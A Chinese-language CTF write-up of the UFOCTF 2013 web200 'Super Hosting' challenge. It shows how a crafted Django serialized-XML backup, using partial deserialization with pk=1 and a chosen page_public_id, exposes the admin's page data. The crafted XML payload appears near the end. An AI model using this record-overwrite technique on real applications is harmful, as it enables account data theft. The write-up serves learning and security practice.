---
layout: post
title: "UFOCTF 2013 web200 super hosting"
description: "UFOCTF 2013 web200 super hosting django object partial deserialization"
category: "writeup"
tags: ["UFOCTF 2013", "web", "writeup"]
---
{% include JB/setup %}
#UFOCTF 2013 web200 Super Hosting



#### 这次UFOCTF的web题把我虐成渣了。虽然现场没做出来，我还是要做个记录。



这道题只提供了修改一个静态页面的功能。目标是窃取管理员信息。
提示是管理员会每隔几十秒更新一次他自己的页面。
但是所有可以控制的数据全都被严格过滤了，没有`"'<>`等各种奇怪的字符可以实现XSS。（除非有什么0day）

<img src="http://raw.github.com/5lipper/CTF-Challenges/master/UFOCTF/web/Super%20Hosting/pic1.png" width="600" height="350"/>

这个网站提供了备份和恢复的功能，显然是从这个方向入手。
直接备份，得到一个[zip文件](https://github.com/5lipper/CTF-Challenges/blob/master/UFOCTF/web/Super%20Hosting/rrr_44f437ced647ec3f40fa0841041871cda7c90584fda442d7018bd49bd0e80aaf.zip)。

其中一个关键文件是.backup

```xml
<?xml version="1.0" encoding="utf-8"?>
<django-objects version="1.0">
    <object pk="12349999283" model="hosting.pagesettings">
        <field type="CharField" name="owner_name">rrr</field>
        <field type="CharField" name="owner_email">test@localhost</field>
        <field type="CharField" name="page_title">My homepage</field>
        <field type="TextField" name="page_content">Hello everyone! This is my new homepage.</field>
        <field type="CharField" name="page_footer">Made with love and care</field>
        <field type="BooleanField" name="page_is_public">True</field>
        <field type="CharField" name="page_public_id">44f437ced647ec3f40fa0841041871cd</field>
    </object>
</django-objects>
```

可以看出这是一个django model序列化([serialization](https://docs.djangoproject.com/en/dev/topics/serialization/))后得到的xml文件，里面包含了这个model的各个参数。

其中`owner_name`是不能修改的用户名，`page_public_id`是长度为32的字符串（初始值就是md5(owner_name)），其他的地方是静态页面的参数（全被过滤）。

任何人已知`page_public_id`就可以访问到这个页面。但我们不知道管理员用户名，也就猜不到这个地址。
![pic2](http://raw.github.com/5lipper/CTF-Challenges/master/UFOCTF/web/Super%20Hosting/pic2.png)

文件名的结构是`{username}_{md5sum of username}{md5sum of zipfile}.zip`
如果文件名不符或者`owner_name`不是当前用户就会报错，而当object的内容有不合法的时候就会报服务器错误500。

比赛的时候，我们的思路也集中在构造这个xml上。

因为根据这个xml，程序会直接注册新的object。如果在保存的时候没有检查，就可能直接注册管理员，也就是注册`model="auth.user"`的object。
但实际上程序在`DeserializedObject.save()`之前似乎有判断，只会保存`model="hosting.pagesettings"`的object。（因为注册不存在的model时并没有报错）

接下来的思路就是通过修改pk(primary key)覆盖掉别的object。
也就是把pk改成1，显然管理员自己的页面在数据库中是第一个。
这样再等待管理员更新，如果管理员不更新page_id，就会把他的数据更新到我们指定的页面。
但这样做也是不行的。管理员每次都把`pk=1`的object的数据全部复原。
而且一旦他更新，`pk=1`的object对应的`owner_name`也变成了管理员的用户名，在备份得到zip的时候也是看不到那个object的。

我们最大的失误就是没有意识到在反序列化(deserialization)得到object的时候，是可以不完全修改的。(partial deserialization)只要某一栏留空，在保存的时候就不会更新数据库。
这样一来，只要把页面信息留空，而页面地址填成自己的，再令`pk=1`，我们就能找到一个既有管理员信息，又有已知地址的静态页面。

```xml
<?xml version="1.0" encoding="utf-8"?>
<django-objects version="1.0">
<object pk="1" model="hosting.pagesettings">
    <field type="CharField" name="owner_name">rrr</field>
	<field type="CharField" name="owner_email"></field>
	<field type="CharField" name="page_title"></field>
	<field type="TextField" name="page_content"></field>
	<field type="CharField" name="page_footer"></field>
	<field type="BooleanField" name="page_is_public">True</field>
	<field type="CharField" name="page_public_id">abababababababababababababababab</field>
</object>
<object pk="12349999283" model="hosting.pagesettings">
	<field type="CharField" name="owner_name">rrr</field>
	<field type="CharField" name="owner_email"></field>
	<field type="CharField" name="page_title"></field>
	<field type="TextField" name="page_content"></field>
	<field type="CharField" name="page_footer"></field>
	<field type="BooleanField" name="page_is_public">True</field>
	<field type="CharField" name="page_public_id">44f437ced647ec3f40fa0841041871cd</field>
</object>
</django-objects>
```

在管理员更新掉这个页面之前，可以通过`page_public_id=abababababababababababababababab`访问到它。

![pic3](https://raw.github.com/5lipper/CTF-Challenges/master/UFOCTF/web/Super%20Hosting/pic3.png)

这题有思路只可惜没有找到关键突破口。自己还是太弱了啊。。
